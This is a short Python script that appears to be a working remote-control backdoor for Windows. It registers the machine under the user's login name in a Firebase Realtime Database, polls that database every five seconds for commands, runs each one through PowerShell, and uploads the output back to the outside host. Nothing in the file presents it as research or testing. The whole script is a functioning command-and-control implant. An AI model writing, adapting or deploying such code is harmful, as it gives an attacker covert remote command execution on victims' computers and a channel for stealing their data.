import requests
import json
import random as rd
import os
import subprocess
import time

# Firebase Realtime Database Base URL
BASE_URL = "https://moms-tailor-default-rtdb.firebaseio.com/first-start"
DATABASE_URL = f"{BASE_URL}.json"

# Generate a unique hostname
hostname = os.getlogin() + str(rd.randint(0, 100))

# Add new hostname entry without replacing existing ones
requests.patch(DATABASE_URL, data=json.dumps({hostname: {"output": "", "command": ""}}))

# Track the current directory
current_dir = os.getcwd()

def check_and_execute():
    global current_dir
    while True:
        try:
            # Fetch data from Firebase
            response = requests.get(DATABASE_URL)
            if response.status_code == 200:
                db_data = response.json()
                if hostname in db_data:
                    command = db_data[hostname].get("command", "")
                    
                    if command and command != "":
                        print(f"Executing: {command}")
                        
                        # Handle directory change commands
                        if command.lower().startswith("cd "):
                            new_dir = command[3:].strip()
                            if new_dir == "..":
                                current_dir = os.path.dirname(current_dir)  # Move to parent directory
                            else:
                                new_path = os.path.join(current_dir, new_dir)
                                if os.path.isdir(new_path):
                                    current_dir = new_path
                                else:
                                    output = f"Error: Directory '{new_dir}' not found."
                                    requests.patch(f"{BASE_URL}/{hostname}.json", data=json.dumps({"output": output, "command": ""}))
                                    continue
                        
                        # Execute command in PowerShell within the current directory
                        process = subprocess.run(["powershell", "-Command", command], cwd=current_dir, capture_output=True, text=True)
                        output = process.stdout if process.stdout else process.stderr
                        
                        # Update output in Firebase
                        update_data = {
                            "output": output,
                            "command": ""
                        }
                        requests.patch(f"{BASE_URL}/{hostname}.json", data=json.dumps(update_data))
            
            time.sleep(5)  # Check every 5 seconds
        except Exception as e:
            print("Error:", e)
            
            # Upload error to Firebase
            error_data = {
                "output": str(e),
                "command": ""
            }
            requests.patch(f"{BASE_URL}/{hostname}.json", data=json.dumps(error_data))
            
            time.sleep(10)  # Wait before retrying in case of error

# Start checking and executing commands
check_and_execute()
